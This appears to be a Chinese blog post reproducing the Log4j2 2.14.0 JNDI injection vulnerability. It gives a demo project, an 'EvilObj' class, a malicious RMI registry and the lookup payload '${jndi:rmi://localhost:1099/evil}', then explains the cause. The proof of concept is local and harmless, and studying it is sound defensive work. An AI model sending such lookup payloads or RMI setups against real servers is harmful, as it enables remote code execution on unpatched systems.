Log4j漏洞复现及原理

# 1.背景

之前在公司收到Log4j2爆出一个重大漏洞，公司有大部分应用使用到了Log4j的2.14.0以下的版本，全公司内部程序员收到消息之后，加班加点升级Log4j的版本到2.14.1（这个版本也不稳定），在此记录一下。

# 2.Log4j的重大漏洞

我们复现一下Log4j 2.14.0版本中出现的安全问题。首先，我们新建一个Maven项目，引入Log4j的jar包

```XML
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>log4j2Demo</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.14.0</version>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.0</version>
        </dependency>
    </dependencies>

</project>
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

在resource目录下定义了log4j2.xml，表示log4j2的日志配置信息

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!--status用来指定log4j本身的打印日志的级别.-->
<Configuration status="WARN">
    <Appenders>
        <!--指定打印到控制台的日志格式-->
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
        </Console>
    </Appenders>
    <Loggers>
        <!-- 默认打印日志级别为 info -->
        <Root level="info">
            <AppenderRef ref="Console"/>
        </Root>
    </Loggers>
</Configuration>
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

接下来是攻击者的自定义类EvilObj，在类加载时执行static静态代码块

```java
package com.lx.rmi;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

/**
 * 在这里实现了ObjectFactory接口，主要是针对EvilObj类无法转换为ObjectFactory对象，其他Java版本中可能不存在这个问题
 * @Author: Xin Liu
 * @Date: 2022/2/15
 */
public class EvilObj implements ObjectFactory {
    static{
        System.out.println("在哪执行的");
    }

    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

攻击者也实现了RMIServer（相当于注册中心）

```java
package com.lx.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @Author: Xin Liu
 * @Date: 2022/2/15
 */
public class RMIServer {
    public static void main(String[] args) {
        try{
            Registry registry = LocateRegistry.createRegistry(1099);

            System.out.println("Create RMI Registry on port 1099");
            String url="localhost";
            Reference reference = new Reference("com.lx.rmi.EvilObj", "com.lx.rmi.EvilObj",url);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil",referenceWrapper);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)



在我们的服务端业务代码中我们使用到了log4j，用info()方法进行打印日志

```java
package com.lx;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @Author: Xin Liu
 * @Date: 2022/2/14
 */
public class Log4j2Test {
    private static final Logger LOGGER= LogManager.getLogger(Log4j2Test.class);

    public static void main(String[] args) {
        // 解决报错 The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        String userName="${jndi:rmi://localhost:1099/evil}";

        LOGGER.info("Hello,{}",userName);
    }
}
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

结果在服务端的控制台中执行EvilObj类加载的输出

![img](https://img-blog.csdnimg.cn/b3609b6f40c047fca37d5a48a0f03694.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAY2hlcmlzaGx4OTg=,size_20,color_FFFFFF,t_70,g_se,x_16)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

#  3.漏洞原理分析

log4j的源码中执行了lookup方法，这个方法是导致本次漏洞的根因。

JNDI Naming Reference，命名引用

当有客户端通过lookup("refObj")获取远程对象时，获取的是一个**Reference存根(Stub)**，由于是Reference存根，所以客户端会先在本地classpath中去检查是否存在refClassName，如果不存在则去指定的url中动态加载，在**log4j的服务器**上执行加载**类的实例化**操作（静态变量、静态代码块）

黑客在自己的客户端启动一个带有恶意代码的rmi服务，通过服务端的log4j的漏洞，向服务端的jndi context lookup的时候连接自己的rmi服务器，服务端连接rmi服务器执行lookup的时候会通过rmi查询到该地址指向的引用并且**本地实例化这个类**，所以在类中的构造方法或者静态代码块中写入逻辑，就会在**服务端（jndi rmi过程中的客户端）**实例化的时候执行到这段逻辑，导致**jndi注入**。

# 4.参考视频

[Log4j高危漏洞！具体原因解析！全网第一！_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1FL411E7g3?from=search&seid=4352282737714061308&spm_id_from=333.337.0.0)